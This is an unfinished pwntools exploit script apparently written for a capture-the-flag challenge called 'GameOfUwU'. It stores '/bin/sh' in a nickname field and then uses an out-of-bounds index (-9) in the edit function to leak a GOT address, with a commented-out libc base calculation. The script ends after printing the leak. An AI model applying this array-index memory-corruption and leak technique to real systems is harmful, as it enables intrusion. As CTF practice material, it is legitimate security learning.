from pwn import * 
import time 
binary = ("./GameOfUwU_patched")

p = process(binary)
p = remote("chal.firebird.sh", 35029)
#libc = ELF('./libc.so.6')

elf = ELF(binary)
s = 'b*edit_nickname+127'
#gdb.attach(p, s)
p.sendline(b'1') # press any key to continue

#context.log_level = 'debug'
# overwriting FireUwU

p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')

p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
p.sendline(b'1')
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
p.sendline(b'-9')
p.recvuntil(b"  Please get a new name to ")

# parse the leaked address to int, hex and potentially further conver to other formats 
GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
#address = GOT_leak - libc.sym['__isoc99_scanf'] # calculate the libc base
print(hex(GOT_leak)) # debugging 
#print(address)